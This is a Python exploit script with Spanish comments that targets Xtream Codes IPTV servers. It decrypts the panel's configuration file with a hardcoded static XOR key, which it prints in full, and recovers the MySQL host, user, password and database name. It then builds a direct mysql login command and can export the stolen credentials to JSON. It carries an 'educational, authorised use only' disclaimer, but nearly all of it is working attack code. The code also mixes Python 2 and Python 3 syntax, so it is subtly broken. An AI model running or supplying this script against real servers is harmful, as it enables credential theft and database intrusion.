#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOIT: Desencriptación de archivo de configuración de Xtream Codes
VULNERABILIDAD: VULN-003 - Weak Encryption (XOR con clave estática)
SEVERIDAD: CRÍTICA
CVE: N/A (0-day)

Descripción:
    El archivo /home/xtreamcodes/iptv_xtream_codes/config contiene
    las credenciales de la base de datos "encriptadas" con XOR usando
    una clave estática hardcodeada en el código fuente.
    
    Este script desencripta el archivo y revela:
    - Host de la base de datos
    - Usuario de MySQL
    - Password de MySQL
    - Nombre de la base de datos
    - Server ID
    - Puerto de MySQL

Autor: Security Research
Fecha: 2026-01-28
Propósito: Educativo y auditoría de seguridad

ADVERTENCIA: Solo usar con autorización explícita
"""

import base64
import json
import sys
import os
from itertools import cycle

# Clave estática hardcodeada en el código original
HARDCODED_KEY = '5709650b0d7806074842c6de575025b1'

class Colors:
    """Colores para output en terminal"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def decrypt_config(encrypted_data):
    """
    Desencripta el archivo de configuración de Xtream Codes
    
    Args:
        encrypted_data (str): Datos encriptados en base64
        
    Returns:
        dict: Configuración desencriptada
    """
    try:
        # Paso 1: Decodificar base64
        decoded = base64.b64decode(encrypted_data)
        
        # Paso 2: Aplicar XOR con la clave estática
        decrypted = ''.join(
            chr(ord(c) ^ ord(k)) 
            for c, k in zip(decoded, cycle(HARDCODED_KEY))
        )
        
        # Paso 3: Parsear JSON
        config = json.loads(decrypted)
        
        return config
    except Exception as e:
        print "{}[ERROR]{} No se pudo desencriptar: {}".format(Colors.FAIL, Colors.ENDC, str(e))
        return None


def print_banner():
    """Imprime banner del exploit"""
    banner = """
{}╔═══════════════════════════════════════════════════════════╗
║  Xtream Codes Config Decryptor                          ║
║  Exploit: VULN-003 - Weak Encryption                    ║
║  Severity: CRITICAL                                     ║
╚═══════════════════════════════════════════════════════════╝{}
    """.format(Colors.HEADER, Colors.ENDC)
    print(banner)


def print_config(config):
    """
    Imprime la configuración desencriptada de forma formateada
    
    Args:
        config (dict): Configuración desencriptada
    """
    print "\n{}[+]{} Credenciales de Base de Datos Recuperadas:\n".format(Colors.OKGREEN, Colors.ENDC)
    print "{}[*]{} Host:        {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.WARNING, config.get('host', 'N/A'), Colors.ENDC)
    print "{}[*]{} Usuario:     {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.WARNING, config.get('db_user', 'N/A'), Colors.ENDC)
    print "{}[*]{} Password:    {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.FAIL, config.get('db_pass', 'N/A'), Colors.ENDC)
    print "{}[*]{} Base de Datos: {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.WARNING, config.get('db_name', 'N/A'), Colors.ENDC)
    print "{}[*]{} Server ID:   {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.WARNING, config.get('server_id', 'N/A'), Colors.ENDC)
    print "{}[*]{} Puerto:      {}{}{}".format(Colors.OKBLUE, Colors.ENDC, Colors.WARNING, config.get('db_port', 'N/A'), Colors.ENDC)
    print("")


def export_to_file(config, filename='decrypted_config.json'):
    """
    Exporta la configuración a un archivo JSON
    
    Args:
        config (dict): Configuración desencriptada
        filename (str): Nombre del archivo de salida
    """
    try:
        with open(filename, 'w') as f:
            json.dump(config, f, indent=4)
        print "{}[+]{} Configuración exportada a: {}{}{}".format(
            Colors.OKGREEN, Colors.ENDC, Colors.WARNING, filename, Colors.ENDC
        )
    except Exception as e:
        print "{}[ERROR]{} No se pudo exportar: {}".format(Colors.FAIL, Colors.ENDC, str(e))


def generate_mysql_command(config):
    """
    Genera comando mysql para conectarse directamente
    
    Args:
        config (dict): Configuración desencriptada
    """
    cmd = "mysql -h {} -P {} -u {} -p'{}' {}".format(
        config.get('host', '127.0.0.1'),
        config.get('db_port', 7999),
        config.get('db_user', ''),
        config.get('db_pass', ''),
        config.get('db_name', '')
    )
    print "{}[+]{} Comando MySQL:\n".format(Colors.OKGREEN, Colors.ENDC)
    print "{}{}{}".format(Colors.WARNING, cmd, Colors.ENDC)
    print("")


def main():
    """Función principal del exploit"""
    print_banner()
    
    # Verificar argumentos
    if len(sys.argv) < 2:
        print "{}[!]{} Uso: {} <archivo_config | datos_encriptados>\n".format(
            Colors.WARNING, Colors.ENDC, sys.argv[0]
        )
        print("Ejemplos:")
        print "  {} /home/xtreamcodes/iptv_xtream_codes/config".format(sys.argv[0])
        print "  {} 'base64_encrypted_data'".format(sys.argv[0])
        print("")
        sys.exit(1)
    
    config_path = sys.argv[1]
    
    # Verificar si es un archivo o datos directos
    if os.path.isfile(config_path):
        print "{}[*]{} Leyendo archivo: {}\n".format(Colors.OKBLUE, Colors.ENDC, config_path)
        try:
            with open(config_path, 'r') as f:
                encrypted_data = f.read().strip()
        except Exception as e:
            print "{}[ERROR]{} No se pudo leer el archivo: {}".format(Colors.FAIL, Colors.ENDC, str(e))
            sys.exit(1)
    else:
        print "{}[*]{} Usando datos proporcionados\n".format(Colors.OKBLUE, Colors.ENDC)
        encrypted_data = config_path
    
    # Desencriptar
    print "{}[*]{} Desencriptando con clave estática: {}...\n".format(
        Colors.OKBLUE, Colors.ENDC, HARDCODED_KEY[:16]
    )
    
    config = decrypt_config(encrypted_data)
    
    if config:
        print_config(config)
        generate_mysql_command(config)
        
        # Preguntar si exportar
        try:
            export = input("{}[?]{} ¿Exportar a JSON? (s/n): ".format(Colors.WARNING, Colors.ENDC))
            if export.lower() in ['s', 'y', 'si', 'yes']:
                export_to_file(config)
        except:
            pass
        
        print "\n{}[+]{} Exploit completado exitosamente!".format(Colors.OKGREEN, Colors.ENDC)
        print "{}[!]{} RECOMENDACIÓN: Cambiar inmediatamente todas las credenciales\n".format(Colors.FAIL, Colors.ENDC)
    else:
        print "{}[ERROR]{} Fallo en la desencriptación\n".format(Colors.FAIL, Colors.ENDC)
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n\n{}[!]{} Exploit interrumpido por el usuario\n".format(Colors.WARNING, Colors.ENDC)
        sys.exit(0)
    except Exception as e:
        print "\n{}[ERROR]{} Error inesperado: {}\n".format(Colors.FAIL, Colors.ENDC, str(e))
        sys.exit(1)
